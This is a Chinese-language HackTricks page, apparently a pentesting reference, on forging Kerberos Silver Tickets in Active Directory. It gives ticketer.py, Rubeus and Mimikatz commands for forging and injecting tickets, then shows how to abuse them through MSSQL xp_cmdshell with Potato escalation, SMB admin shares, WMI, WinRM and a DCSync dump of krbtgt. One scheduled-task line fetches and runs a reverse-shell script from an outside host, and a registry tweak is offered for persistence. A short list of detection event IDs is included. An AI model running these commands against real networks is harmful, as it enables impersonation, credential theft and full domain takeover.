# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver Ticket

**Silver Ticket** 攻击涉及利用 Active Directory (AD) 环境中的 service tickets。此方法依赖于**获取 service account 的 NTLM hash**，例如 computer account 的 hash，以伪造 Ticket Granting Service (TGS) ticket。通过这个伪造的 ticket，攻击者可以访问网络上的特定服务，**冒充任意用户**，通常目标是获取管理员权限。需要强调的是，使用 AES keys 伪造 tickets 更加安全，也更难被检测到。<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets 比 Golden Tickets 更难被检测，因为它们只需要 **service account 的 hash**，而不需要 krbtgt account 的 hash。但是，它们仅限于所针对的特定服务。此外，只窃取用户的密码。
此外，如果你 compromise 了一个**带有 SPN 的 account 的密码**，就可以使用该密码创建 Silver Ticket，从而冒充该服务的任意用户。

### Modern Kerberos changes (AES-only domains)

- 从 **2022 年 11 月 8 日 (KB5021131)** 开始的 Windows 更新，会在可能的情况下默认使用 **AES session keys** 作为 service tickets，并逐步淘汰 RC4。预计到 **2026 年年中**，DC 将默认禁用 RC4，因此依赖 NTLM/RC4 hashes 的 Silver Tickets 越来越容易因 `KRB_AP_ERR_MODIFIED` 失败。始终为目标 service account 提取 **AES keys**（`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`）。<sup>[[5]](#references)</sup>
- 如果 service account 的 `msDS-SupportedEncryptionTypes` 被限制为 AES，则必须使用 `/aes256` 或 `-aesKey` 进行伪造；即使持有 NTLM hash，RC4（`/rc4` 或 `-nthash`）也无法工作。<sup>[[6]](#references)</sup>
- gMSA/computer accounts 每 30 天轮换一次；在伪造之前，应从 LSASS、Secretsdump/NTDS 或 DCsync 中 dump **当前的 AES key**。
- OPSEC：tools 中的默认 ticket 生命周期通常为 **10 年**；应设置合理的持续时间（例如 `-duration 600` 分钟），以避免因异常的生命周期而被检测到。<sup>[[6]](#references)</sup>

针对 ticket crafting，会根据操作系统使用不同的 tools：

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 在 Windows 上
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS 服务被强调为访问受害者文件系统的常见目标，但也可以利用 HOST 和 RPCSS 等其他服务执行任务和 WMI 查询。

### 示例：MSSQL 服务（MSSQLSvc）+ Potato 提权至 SYSTEM

如果你拥有 SQL 服务账户（例如 sqlsvc）的 NTLM hash（或 AES key），就可以为 MSSQL SPN 伪造 TGS，并以任意用户身份冒充访问 SQL 服务。之后，启用 xp_cmdshell，以 SQL 服务账户身份执行命令。如果该 token 具有 SeImpersonatePrivilege，则可以链式使用 Potato 提权至 SYSTEM。<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 如果获得的上下文具有 SeImpersonatePrivilege（服务账户通常是这种情况），请使用 Potato 变体获取 SYSTEM：
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
更多关于滥用 MSSQL 和启用 xp_cmdshell 的详细信息：

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques 概览：

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 可用服务

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

使用 **Rubeus**，你可以通过以下参数**请求所有**这些 tickets：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624：Account Logon
- 4634：Account Logoff
- 4672：Admin Logon
- **在 DC 上，对于同一客户端/服务不存在先前的 4768/4769**，这是伪造的 TGS 被直接提交给服务的常见指标。
- 在 4769/4624 数据中，异常长的 ticket lifetime 或意外的加密类型（域强制使用 AES 时却使用 RC4）也很明显。

## 持久化

为避免机器每 30 天轮换一次密码，设置 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`，或者可以将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于 30 天的值，以指示机器密码应当轮换的周期。<sup>[[3]](#references)</sup>

## 滥用 Service tickets

在以下示例中，假设 ticket 是通过 impersonating administrator account 获取的。

### CIFS

使用此 ticket，你将能够通过 **SMB** 访问 `C$` 和 `ADMIN$` 文件夹（如果它们已暴露），并且只需执行类似以下操作，即可将文件复制到远程文件系统的一部分：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
你还可以使用 **psexec** 在主机内获取 shell，或执行任意命令：


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

拥有此权限后，你可以在远程计算机中创建计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

使用这些票据，你可以在目标系统中**执行 WMI**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
查找以下页面中关于 **wmiexec** 的**更多信息**：

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

通过计算机上的 winrm 访问权限，你可以**访问该计算机**，甚至获取一个 PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
查看以下页面，了解使用 **winrm** 连接远程主机的**更多方法**：


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 请注意，远程计算机上必须启用并监听 **winrm**，才能访问它。

### LDAP

拥有此权限后，你可以使用 **DCSync** 转储 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**在以下页面了解更多关于 DCSync 的信息：**


{{#ref}}
dcsync.md
{{#endref}}


## 参考资料

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos（II）：如何攻击 Kerberos？ - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [机器账户密码流程 - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf：Silver Ticket + Potato 路径](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos 强化与 RC4 弃用](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py 当前选项（AES/keytab/duration）](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
